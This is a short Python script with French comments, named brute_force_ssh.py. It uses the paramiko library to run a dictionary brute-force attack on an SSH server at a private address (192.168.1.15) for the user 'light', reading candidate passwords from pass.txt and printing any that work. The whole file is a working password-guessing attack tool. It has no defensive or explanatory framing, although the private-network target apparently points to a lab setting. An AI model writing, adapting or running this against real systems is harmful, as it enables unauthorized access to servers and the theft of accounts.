#! /usr/bin/python3

'''
Fichier : brute_force_ssh.py
Description : Effectue un brute-force sur le serveur ssh
Version : 1
'''

__auteur__ = 'jd'

# importation des librairies
import os, paramiko, socket, subprocess

try:
    # déclaration des variables
    line = '\n'+'-'*50+'\n'
    ip = '192.168.1.15'
    utilisateur = 'light'
    dic_mdp = './pass.txt'

    # vérification de l'existence du dictionnaire des mots de passe
    if os.path.exists(dic_mdp) == False:
        print('\n[*] ERREUR : Le chemin du dictionnaire des mots de passe est incorrect !')
        exit()

except Exception:
    print("Une erreur s'est produite !\n")
    exit()

# fonction qui va effectuer la connexion au serveur ssh
def ssh_connect(motdepasse, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ip, port=22, username=utilisateur, password=motdepasse)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code

# nettoyage de la console
subprocess.call('clear', shell = True)

# définition de couleurs pour l'esthétique
c_normal = '\033[0m'
c_vert = '\033[32m'

dic_mdp = open(dic_mdp)

print("\nBrute-force ssh en cours sur l'hôte %s\n" % (ip))

# boucles qui vont parcourir les utilisateurs et les mots de passe
for mot in dic_mdp:
    motdepasse = mot.strip('\n')
    try:
        reponse = ssh_connect(motdepasse)

        if reponse == 0:
            print(line+'Identifiants trouvés !\n\n'+c_vert+'\t[*]'+c_normal+' Utilisateur : '+utilisateur+'\n\t'+c_vert+'[*]'+c_normal+' Mot de passe : %s%s' % (motdepasse, line))
            exit()
        elif reponse == 1:
            print('[*] Identifiants testés : %s / %s' % (utilisateur, motdepasse))
        elif reponse == 2:
            print("[*] Impossible d'établir une connexion sur l'hôte %s" % (ip))
            exit()

    except KeyboardInterrupt:
        print('Vous avez appuyé sur Ctrl-C !\n')
        exit()

dic_mdp.close()